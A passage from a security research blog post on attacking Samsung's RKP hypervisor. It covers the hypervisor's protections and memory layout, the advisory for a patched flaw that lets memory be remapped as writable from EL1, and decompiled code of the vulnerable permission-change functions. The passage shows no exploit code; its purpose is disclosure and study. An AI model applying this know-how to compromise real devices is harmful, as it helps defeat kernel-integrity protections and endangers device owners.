<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <!-- Encoding -->
    <meta charset="utf-8">

    <!-- Title -->
    <title>Attacking Samsung RKP - Impalabs Blog</title>
    <meta name="description" content="This is a follow-up to the Samsung RKP Compendium blog post which provided a comprehensive reference of the security hypervisor's inner workings. In this blog post, we will detail how we attacked Samsung RKP. We will reveal 3 vulnerabilities that we have used to compromise the hypervisor and its assurances. We will also explain how we came up with the exploitation paths for these vulnerabilities. Finally, we will take a look at the patches released by Samsung after we reported them.">

    <!-- Favicons -->
    <link rel="icon" href="https://blog.impalabs.com/img/favicons/favicon.svg" type="image/svg+xml">
    <link rel="icon" href="https://blog.impalabs.com/img/favicons/favicon.ico">
    <link rel="apple-touch-icon" href="https://blog.impalabs.com/img/favicons/favicon-180.png">
    <link rel="manifest" href="https://blog.impalabs.com/img/favicons/manifest.webmanifest">

    <!-- CSS -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/style.css">

    <!-- SEO -->
    <meta property="og:title" content="Attacking Samsung RKP">
    <meta property="og:description" content="This is a follow-up to the Samsung RKP Compendium blog post which provided a comprehensive reference of the security hypervisor's inner workings. In this blog post, we will detail how we attacked Samsung RKP. We will reveal 3 vulnerabilities that we have used to compromise the hypervisor and its assurances. We will also explain how we came up with the exploitation paths for these vulnerabilities. Finally, we will take a look at the patches released by Samsung after we reported them.">
    <meta property="og:image" content="https://blog.impalabs.com/img/social/og.png">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@the_impalabs">
    <meta name="twitter:title" content="Attacking Samsung RKP">
    <meta name="twitter:description" content="This is a follow-up to the Samsung RKP Compendium blog post which provided a comprehensive reference of the security hypervisor's inner workings. In this blog post, we will detail how we attacked Samsung RKP. We will reveal 3 vulnerabilities that we have used to compromise the hypervisor and its assurances. We will also explain how we came up with the exploitation paths for these vulnerabilities. Finally, we will take a look at the patches released by Samsung after we reported them.">
    <meta name="twitter:image" content="https://blog.impalabs.com/img/social/twitter.png">
    <meta name="twitter:image:alt" content="impalabs blog logo twitter card">

    <!-- RSS Feed -->
    <link rel="alternate" type="application/rss+xml" title="Impalabs Blog" href="https://blog.impalabs.com/feed.xml">
</head>

<body>
    <!-- Header -->
    <header class="impalabs-header">
        <!-- Stars -->
        <div class="impalabs-header-stars"></div>

        <!-- Navbar -->
        <nav class="navbar" aria-label="main navigation">
            <div class="container">
                <!-- Navbar logo -->
                <div class="navbar-brand">
                    <a class="navbar-item" href="https://blog.impalabs.com/">
                        <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/impalabs_logo_name_light.svg" alt="impalabs light logo and name" width="362.656px" height="96px">
                    </a>
                </div>

                <!-- Navbar burger toggle -->
                <input type="checkbox" id="navbar-burger-toggle" class="navbar-burger-toggle is-hidden">
                <label for="navbar-burger-toggle" class="navbar-burger">
                    <span></span>
                    <span></span>
                    <span></span>
                </label>

                <!-- Navbar menu -->
                <div class="navbar-menu">
                    <div class="navbar-end has-text-centered">
                        <a href="https://blog.impalabs.com/" class="navbar-item">
                            <button class="button is-primary">
                                Articles
                            </button>
                        </a>
                        <a href="https://blog.impalabs.com/tags/" class="navbar-item">
                            <button class="button is-primary">
                                Tags
                            </button>
                        </a>
                        <a type="application/rss+xml" href="https://blog.impalabs.com/feed.xml" class="navbar-item">
                            <button class="button is-primary">
                                RSS
                            </button>
                        </a>
                        <a href="https://impalabs.com/" class="navbar-item">
                            <button class="button is-primary">
                                Website
                            </button>
                        </a>
                    </div>
                </div>
            </div>
        </nav>

        <!-- Impalabs space base -->
        <div class="section" id="impalabs-space-base">
            <div class="container is-centered">
                <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/space_base.svg" alt="impalabs space base graphics" width="1133px" height="360px">
            </div>
        </div>
    </header>

    <!-- Blog content section -->
    <section id="content" class="section">
        <div class="container container-out">
            <div class="container content container-in">


<span itemscope="" itemtype="http://schema.org/BlogPosting">

<!-- Title -->
<span class="blog-title" itemprop="name headline">Attacking Samsung RKP</span>

<!-- Metadata -->
<div class="columns is-centered is-multiline blog-metadata">
    <!-- Date -->
    <div class="column is-narrow blog-date">
        <span itemprop="datePublished"><time datetime="2021-11-25"><img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/calendar.svg" alt="Calendar icon" width="30px" height="30px"> Nov 25, 2021</time></span>
    </div>
    <!-- Authors -->
    <div class="column is-narrow blog-authors">
        <span><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <a href="https://blog.impalabs.com/authors/alexandre-adamski.html"><img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/users.svg" alt="Users icon" width="30px" height="30px"> <span itemprop="name">Alexandre Adamski</span></a>
</span></span>
    </div>
    <!-- Tags -->
    <meta itemprop="keywords" content="Android,Kernel,Samsung,RKP,Hypervisor,Vulnerability Research,Exploitation">
    <div class="column is-narrow blog-tags">
        <a href="https://blog.impalabs.com/tags/android.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Android</a> <a href="https://blog.impalabs.com/tags/kernel.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Kernel</a> <a href="https://blog.impalabs.com/tags/samsung.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Samsung</a> <a href="https://blog.impalabs.com/tags/rkp.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> RKP</a> <a href="https://blog.impalabs.com/tags/hypervisor.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Hypervisor</a> <a href="https://blog.impalabs.com/tags/vulnerability-research.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Vulnerability Research</a> <a href="https://blog.impalabs.com/tags/exploitation.html">
    <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Exploitation</a>
    </div>
</div>

<!-- Disclaimer -->
<article id="disclaimer" class="message is-info">
    <div class="message-header is-info">Disclaimer</div>
    <div class="message-body">
        <p>This work was done while we were working at <a href="https://longterm.io/">Longterm Security</a> and they have kindly allowed us to release the article on our company's blog.</p>
    </div>
</article>

<!-- Summary -->
<meta itemprop="description" content="This is a follow-up to the Samsung RKP Compendium blog post which provided a comprehensive reference of the security hypervisor's inner workings. In this blog post, we will detail how we attacked Samsung RKP. We will reveal 3 vulnerabilities that we have used to compromise the hypervisor and its assurances. We will also explain how we came up with the exploitation paths for these vulnerabilities. Finally, we will take a look at the patches released by Samsung after we reported them.">
<span class="blog-summary"><p>This is a follow-up to the <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html">Samsung RKP Compendium</a>
 blog post which provided a comprehensive reference of the security 
hypervisor's inner workings. In this blog post, we will detail how we 
attacked Samsung RKP. We will reveal 3 vulnerabilities that we have used
 to compromise the hypervisor and its assurances. We will also explain 
how we came up with the exploitation paths for these vulnerabilities. 
Finally, we will take a look at the patches released by Samsung after we
 reported them.</p></span>

<!-- Separator -->
<span id="blog-separator"></span>

<!-- Table of contents -->
<article class="message">
    <div class="message-body">
        <div class="toc"><span class="toctitle">Table of Contents</span><ul>
<li><a href="#introduction">Introduction</a><ul>
<li><a href="#virtualization-extensions">Virtualization Extensions</a></li>
<li><a href="#samsung-rkp-assurances">Samsung RKP Assurances</a></li>
<li><a href="#samsung-rkp-implementation">Samsung RKP Implementation</a></li>
<li><a href="#samsung-rkp-initialization">Samsung RKP Initialization</a></li>
<li><a href="#our-research-device">Our Research Device</a></li>
</ul>
</li>
<li><a href="#remapping-rkp-memory-as-writable-from-el1">Remapping RKP memory as writable from EL1</a><ul>
<li><a href="#vulnerability">Vulnerability</a></li>
<li><a href="#exploitation">Exploitation</a></li>
<li><a href="#patch">Patch</a></li>
</ul>
</li>
<li><a href="#writing-executable-kernel-pages">Writing executable kernel pages</a><ul>
<li><a href="#vulnerability_1">Vulnerability</a></li>
<li><a href="#exploitation_1">Exploitation</a></li>
<li><a href="#patch_1">Patch</a></li>
</ul>
</li>
<li><a href="#writing-to-read-only-kernel-memory">Writing to read-only kernel memory</a><ul>
<li><a href="#vulnerability_2">Vulnerability</a></li>
<li><a href="#exploitation_2">Exploitation</a></li>
<li><a href="#patch_2">Patch</a></li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#timeline">Timeline</a></li>
</ul>
</div>

    </div>
</article>


<!-- Blogpost content start =============================================== -->
<span itemprop="articleBody">
<p>In January 2021, we reported 3 vulnerabilities in Samsung's security 
hypervisor implementation. Each of the vulnerabilities has a different 
impact: from writing to hypervisor-enforced read-only memory, to 
compromising the hypervisor itself. The vulnerabilities were fixed in 
the <a href="https://security.samsungmobile.com/securityUpdate.smsb">June 2021</a> and <a href="https://security.samsungmobile.com/securityUpdate.smsb">October 2021</a>
 security updates. While they are specific to Samsung RKP, we think that
 they are good examples of what you should be keeping an eye out for if 
you're auditing a security hypervisor running on an ARMv8 device.</p>
<p>We will detail each of the vulnerabilities, explain how they can be 
exploited, and also take a look at their patch. While we recommend 
reading the original blog post, because it will make it easier to 
understand this one, we tried to summarize all the important bits in the
 introduction. Feel free to skip the introduction if you are already 
familiar with Samsung RKP.</p>
<h1 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">¶</a></h1>
<p>The main goal of a security hypervisor on a mobile device is to 
ensure kernel integrity at run time, so that even if an attacker has 
found a kernel vulnerability, they won't be able to modify sensitive 
kernel data structures, elevate privileges, or execute malicious code. 
In order to do that, the hypervisor is executing at a higher privilege 
level (EL2) than the kernel (EL1), and it can have complete control over
 it by making use of the virtualization extensions.</p>
<h2 id="virtualization-extensions">Virtualization Extensions<a class="headerlink" href="#virtualization-extensions" title="Permanent link">¶</a></h2>
<p>One of the features of the virtualization extensions is a second 
layer of address translation. When it is disabled, there is only one 
layer of address translation, which translates a <em>Virtual Address</em> (VA) directly into a <em>Physical Address</em>
 (PA). But when it is enabled, the first layer (stage 1 - under control 
of the kernel) now translates a VA into what is called an <em>Intermediate Physical Address</em>
 (IPA), and the second layer (stage 2 - under control of the hypervisor)
 translates this IPA into the real PA. This second layer has its own 
memory attributes, allowing the hypervisor to enforce memory permissions
 that differ from the ones in the kernel page tables, as well as to 
disable access to physical memory regions.</p>
<p>Another feature of the virtualization extensions, enabled by the use of the <em>Hypervisor Configuration Register</em>
 (HCR), allows the hypervisor to handle general exceptions and to trap 
critical operations usually handled by the kernel. Finally, in the cases
 where the kernel (EL1) needs to call into the hypervisor (EL2), it can 
do so by executing an <em>HyperVisor Call</em> (HVC) instruction. This is very similar to the <em>SuperVisor Call</em> (SVC) instruction that is used by userland processes (EL0) to call into the kernel (EL1).</p>
<h2 id="samsung-rkp-assurances">Samsung RKP Assurances<a class="headerlink" href="#samsung-rkp-assurances" title="Permanent link">¶</a></h2>
<p>Samsung implementation of a security hypervisor enforces that:</p>
<ul>
<li>the page tables cannot be modified directly by the kernel;<ul>
<li>accesses to virtual memory system registers at EL1 are trapped;</li>
<li>page tables are set as read-only in the stage 2 address translation;<ul>
<li>except for level 3 tables, but in that case the PXNTable bit is set;</li>
</ul>
</li>
</ul>
</li>
<li>double mappings are prevented (but the checking is only done by the kernel);<ul>
<li>still, we can't make the kernel text read-write or a new region executable;</li>
</ul>
</li>
<li>sensitive kernel global variables are moved in the <code>.rodata</code> region (read-only);</li>
<li>sensitive kernel data structures (<code>cred</code>, <code>task_security_struct</code>, <code>vfsmount</code>) are allocated on read-only pages;<ul>
<li>on various operations, the credentials of a running task are checked:<ul>
<li>a task that is not <code>system</code> cannot suddenly become <code>system</code> or <code>root</code>;</li>
<li>it is possible to set the <code>cred</code> field of a <code>task_struct</code> in an exploit;</li>
<li>but the next operation, like executing a shell, will trigger a violation;</li>
</ul>
</li>
<li>credentials are also reference-counted to prevent their reuse by another task;</li>
</ul>
</li>
<li>it is not possible to execute a binary as <code>root</code> from outside of specific mount points;</li>
<li>on Snapdragon devices, ROPP (ROP prevention) is also enabled by RKP.</li>
</ul>
<h2 id="samsung-rkp-implementation">Samsung RKP Implementation<a class="headerlink" href="#samsung-rkp-implementation" title="Permanent link">¶</a></h2>
<p>Samsung RKP makes extensive use of two utility structures: <em>memlists</em> and <em>sparsemaps</em>.</p>
<ul>
<li>A memlist is a list of address ranges (sort of a specialized version of <code>std::vector</code>).</li>
<li>A sparsemap associates values to addresses (sort of a specialized version of <code>std::map</code>).</li>
</ul>
<p>There are multiple instances of these control structures, listed below by order of initialization:</p>
<ul>
<li>the memlist <code>dynamic_regions</code> contains the DRAM regions (sent by S-Boot);</li>
<li>the memlist <code>protected_ranges</code> contains critical hypervisor SRAM/DRAM regions;</li>
<li>the sparsemap <code>physmap</code> associates a type (kernel text, PT, etc.) to each DRAM page;</li>
<li>the sparsemap <code>ro_bitmap</code> indicates if a DRAM page is read-only in the stage 2;</li>
<li>the sparsemap <code>dbl_bitmap</code> is used by the kernel to detect double-mapped DRAM pages;</li>
<li>the memlist <code>page_allocator.list</code> contains the DRAM region used by RKP's page allocator;</li>
<li>the sparsemap <code>page_allocator.map</code> tracks DRAM pages allocated by RKP's page allocator;</li>
<li>the memlist <code>executable_regions</code> contains the kernel's executable pages;</li>
<li>the memlist <code>dynamic_load_regions</code> is used by the "dynamic load" feature.</li>
</ul>
<p>Please note that these control structures are used by the hypervisor 
for keeping track of what is in memory and how it is mapped. But they 
have no direct impact on the actual address translation (unlike the 
stage 2 page tables). The hypervisor has to carefully keep in sync the 
control structures and page tables to avoid issues.</p>
<p>The hypervisor has multiple allocators, which all serves a different purpose:</p>
<ul>
<li>the "static heap" contains SRAM memory (before initialization) and also DRAM memory (after initialization);<ul>
<li>It is used for the EL2 page tables, for the memlists and for the PA's descriptors;</li>
</ul>
</li>
<li>the "dynamic heap" contains only DRAM memory (and the PA's memory region is carved out of it);<ul>
<li>It is used for the EL1 stage 2 page tables and for the sparsemaps (entries and bitmaps);</li>
</ul>
</li>
<li>the "page allocator" (PA) contains only DRAM memory;<ul>
<li>It is used for allocating the EL1 stage 1 page tables and for the pages of protected SLUB caches.</li>
</ul>
</li>
</ul>
<h2 id="samsung-rkp-initialization">Samsung RKP Initialization<a class="headerlink" href="#samsung-rkp-initialization" title="Permanent link">¶</a></h2>
<p>The initialization of the hypervisor (alongside of the kernel) is 
detailed in the first blog post. It is crucial when looking for 
vulnerabilities to know what the state of the various control structures
 is at a given moment, as well as what the page tables for the stage 2 
at EL1 and stage 1 at EL2 contain. The hypervisor state after 
initialization is reported below.</p>
<p>The control structures are as follows:</p>
<ul>
<li>The <code>protected_ranges</code> contains the hypervisor code/data and the memory backing the <code>physmap</code>.</li>
<li>In the <code>physmap</code>,<ul>
<li>the kernel <code>.text</code> segment is marked as <code>TEXT</code>;</li>
<li>user PGDs, PMDs, and PTEs are marked as <code>L1</code>, <code>L2</code>, <code>L3</code> respectively;</li>
<li>kernel PGDs, PMDs, and PTEs are marked as <code>KERNEL|L1</code>, <code>KERNEL|L2</code>, <code>KERNEL|L3</code> respectively.</li>
</ul>
</li>
<li>The <code>ro_bitmap</code> contains the kernel <code>.text</code> and <code>.rodata</code>
 segments, and other pages that have been made read-only in the stage 2 
(like the L1, L2, and some of the L3 kernel page tables).</li>
<li>The <code>executable_regions</code> contains the kernel <code>.text</code> segment and trampoline page.</li>
</ul>
<p>In the page tables of EL2 stage 1 (controlling what the hypervisor can access):</p>
<ul>
<li>the hypervisor segments are mapped (from the initial PTs);</li>
<li>the log and "bigdata" regions are mapped as RW;</li>
<li>the kernel <code>.text</code> segment is mapped as RO;</li>
<li>the first page of <code>swapper_pg_dir</code> is mapped as RW.</li>
</ul>
<p>In the page tables of EL1 stage 2 (controlling what the kernel can really access):</p>
<ul>
<li>the hypervisor memory region is unmapped;</li>
<li><code>empty_zero_page</code> is mapped as RWX;</li>
<li>the log region is mapped as ROX;</li>
<li>the region backing the "dynamic heap" is mapped as ROX;</li>
<li>PGDs are mapped as RO:<ul>
<li>the PXN bit is set on block descriptors;</li>
<li>the PXN bit is set on table descriptors but only for user PGDs.</li>
</ul>
</li>
<li>PMDs are mapped as RO:<ul>
<li>the PXN bit is set on descriptor for VAs not in the <code>executable_regions</code>.</li>
</ul>
</li>
<li>PTEs are mapped as RO for VAs in the <code>executable_regions</code>.</li>
<li>the kernel <code>.text</code> segment is mapped as ROX.</li>
</ul>
<h2 id="our-research-device">Our Research Device<a class="headerlink" href="#our-research-device" title="Permanent link">¶</a></h2>
<p>Our test device during this research was a Samsung A51 (SM-A515F). 
Instead of using a full exploit chain, we have downloaded the kernel 
source code on Samsung's <a href="https://opensource.samsung.com/main">Open Source website</a>, added a few syscalls, recompiled the kernel, and flashed it onto the device.</p>
<p>The new syscalls make it really convenient to interact with RKP and allow us from userland to:</p>
<ul>
<li>read kernel memory;</li>
<li>write kernel memory;</li>
<li>allocate kernel memory;</li>
<li>free kernel memory;</li>
<li>make a hypervisor call (using the <code>uh_call</code> function).</li>
</ul>
<h1 id="remapping-rkp-memory-as-writable-from-el1">Remapping RKP memory as writable from EL1<a class="headerlink" href="#remapping-rkp-memory-as-writable-from-el1" title="Permanent link">¶</a></h1>
<div class="codehilite"><pre><span></span><code>SVE-2021-20178 (CVE-2021-25415): Possible remapping RKP memory as writable from EL1

Severity: High
Affected versions: Q(10.0), R(11.0) devices with Exynos9610, 9810, 9820, 9830
Reported on: January 4, 2021
Disclosure status: Privately disclosed.
Assuming EL1 is compromised, an improper address validation in RKP prior to SMR JUN-2021 Release 1 allows local attackers to remap EL2 memory as writable.
The patch adds the proper address validation in RKP to prevent change of EL2 memory attribution from EL1.
</code></pre></div>

<h2 id="vulnerability">Vulnerability<a class="headerlink" href="#vulnerability" title="Permanent link">¶</a></h2>
<p>When RKP needs to change the permissions of a memory region in the stage 2, it uses either <code>rkp_s2_page_change_permission</code> that operates on a single page, or <code>rkp_s2_range_change_permission</code>
 that operates on an address range. These functions can be abused to 
remap hypervisor memory (that was unmapped during initialization) as 
writable from the kernel, allowing to fully compromise the security 
hypervisor. Let's see how and why we can do that.</p>
<div id="rkp_s2_page_change_permission">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_s2_page_change_permission</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">access</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">exec</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">allow</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allow</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">rkp_inited</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">574</span><span class="p">,</span> <span class="s">"s2 page change access not allowed before init %d"</span><span class="p">,</span> <span class="n">allow</span><span class="p">);</span>
    <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"s2 page change access not allowed, p_addr : %p"</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_s2unmap</span><span class="p">(</span><span class="n">p_addr</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Error page was s2 unmapped before %p"</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">page_allocator_is_allocated</span><span class="p">(</span><span class="n">p_addr</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">p_addr</span> <span class="o">&gt;=</span> <span class="n">TEXT_PA</span> <span class="o">&amp;&amp;</span> <span class="n">p_addr</span> <span class="o">&lt;</span> <span class="n">ETEXT_PA</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">p_addr</span> <span class="o">&gt;=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">SRODATA</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">p_addr</span> <span class="o">&lt;</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">ERODATA</span><span class="p">))</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">270</span><span class="p">,</span> <span class="s">"Page access change out of static RO range %lx %lx %lx"</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">exec</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">access</span> <span class="o">==</span> <span class="mh">0x80</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">++</span><span class="n">page_ro</span><span class="p">;</span>
    <span class="n">attrs</span> <span class="o">=</span> <span class="n">UNKN1</span> <span class="o">|</span> <span class="n">READ</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="o">++</span><span class="n">page_free</span><span class="p">;</span>
    <span class="n">attrs</span> <span class="o">=</span> <span class="n">UNKN1</span> <span class="o">|</span> <span class="n">WRITE</span> <span class="o">|</span> <span class="n">READ</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">p_addr</span> <span class="o">==</span> <span class="n">ZERO_PG_ADDR</span> <span class="o">||</span> <span class="n">exec</span><span class="p">)</span>
    <span class="n">attrs</span> <span class="o">|=</span> <span class="n">EXEC</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">map_s2_page</span><span class="p">(</span><span class="n">p_addr</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">attrs</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"map_s2_page failed, p_addr : %p, attrs : %d"</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">attrs</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">tlbivaae1is</span><span class="p">(((</span><span class="n">p_addr</span> <span class="o">+</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0xFFFFFFC000000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">rkp_set_pgt_bitmap</span><span class="p">(</span><span class="n">p_addr</span><span class="p">,</span> <span class="n">access</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>rkp_s2_page_change_permission</code> does some checking on its arguments:</p>
<ul>
<li>if <code>allow == 0</code>, then RKP must be initialized;</li>
<li>the page must not be marked <code>S2UNMAP</code> in the <code>physmap</code>;</li>
<li>it must not be belong to the hypervisor page allocator (<code>robuf</code> sparsemap);</li>
<li>it must not be in the kernel <code>.text</code> or <code>.rodata</code> segments.</li>
</ul>
<p>After that it determines the memory attributes to apply to the page based on the arguments, calls <code>map_s2_page</code> that effectively modifies the stage 2 page tables, flushes the TLBs and marks the page as read-only or not in the <code>ro_bitmap</code>.</p>
<div id="rkp_s2_range_change_permission">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_s2_range_change_permission</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span>
                                       <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">,</span>
                                       <span class="kt">uint64_t</span> <span class="n">access</span><span class="p">,</span>
                                       <span class="kt">uint32_t</span> <span class="n">exec</span><span class="p">,</span>
                                       <span class="kt">uint32_t</span> <span class="n">allow</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="s">"RKP_4acbd6db%lxRKP_00950f15%lx"</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allow</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">rkp_inited</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">593</span><span class="p">,</span> <span class="s">"s2 range change access not allowed before init"</span><span class="p">);</span>
    <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Range change permission prohibited"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">allow</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="n">rkp_deferred_inited</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">603</span><span class="p">,</span> <span class="s">"s2 change access not allowed after def-init"</span><span class="p">);</span>
    <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Range change permission prohibited"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(((</span><span class="n">start_addr</span> <span class="o">|</span> <span class="n">end_addr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="s">"start or end addr is not aligned, %p - %p"</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">start_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="s">"start addr is bigger than end addr %p, %p"</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">end_addr</span> <span class="o">-</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">access</span> <span class="o">==</span> <span class="mh">0x80</span><span class="p">)</span>
    <span class="n">attrs</span> <span class="o">=</span> <span class="n">UNKN1</span> <span class="o">|</span> <span class="n">READ</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="n">attrs</span> <span class="o">=</span> <span class="n">UNKN1</span> <span class="o">|</span> <span class="n">WRITE</span> <span class="o">|</span> <span class="n">READ</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">exec</span><span class="p">)</span>
    <span class="n">attrs</span> <span class="o">|=</span> <span class="n">EXEC</span><span class="p">;</span>
  <span class="n">p_addr_start</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">s2_map</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span> <span class="o">-</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">attrs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p_addr_start</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="s">"s2_map returned false, p_addr_start : %p, size : %p"</span><span class="p">,</span> <span class="n">p_start_addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
